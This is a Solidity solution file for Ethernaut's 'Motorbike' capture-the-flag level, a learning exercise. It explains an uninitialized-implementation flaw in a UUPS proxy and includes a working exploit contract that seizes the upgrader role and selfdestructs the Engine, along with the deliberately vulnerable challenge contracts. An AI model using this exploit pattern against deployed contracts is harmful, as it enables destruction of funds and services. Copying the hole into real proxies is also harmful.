// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 25. MOTORBIKE
 * @dev Selfdestruct the Engine contract and make the Motorbike contract unusable.
 */

interface IEngine {
    function upgrader() external view returns (address);

    function initialize() external;

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;
}

/*
In order to selfdestruct the Engine contract, we need to upgrade it to a new implementation since there is no
selfdestruct() in this one. We can call the upgradeToAndCall function for that, but we first need to become
the upgrader inside the Engine contract to pass the _authorizeUpgrade() check.

There is not way to do that by calling the Motorbike contract directly. But, we see that the Motorbike contract 
is using a delegatecall to initialize the Engine contract. This means that, as far as the Engine knows, the upgrader
hasn't been set yet (still address(0)), so we can call the initialize function from our exploit contract directly.
*/

/*
To get the current Engine implementation address, type this in your Ethernaut browser console:
await web3.eth.getStorageAt(instance, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');
=> 0x000000000000000000000000239bcf976042946e51690c2de9fea5d017eb282c
=> 0x239bcf976042946e51690c2de9fea5d017eb282c
*/

contract Ethernaut_Motorbike {
    function attack(IEngine engine) public {
        // 1. Initialize the engine contract
        engine.initialize();
        // 2. Upgrade the engine contract to a new implementation and kill it
        engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("destruct()")
        );
    }

    function destruct() public {
        selfdestruct(payable(address(0)));
    }
}

// LEVEL UNBEATABLE SINCE THE DENCUN UPGRADE - SEE EIP6780 | selfdestruct

/*////////////////////////////////////////////////////////////////
                        CHALLENGE CONTRACT
////////////////////////////////////////////////////////////////*/

import {Initializable} from "@openzeppelin/contracts/proxy/utils/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(
            Address.isContract(_logic),
            "ERC1967: new implementation is not a contract"
        );
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success, ) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(
                gas(),
                implementation,
                0,
                calldatasize(),
                0,
                0
            )
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(
        bytes32 slot
    ) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success, ) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(
            Address.isContract(newImplementation),
            "ERC1967: new implementation is not a contract"
        );

        AddressSlot storage r;
        assembly {
            r.slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
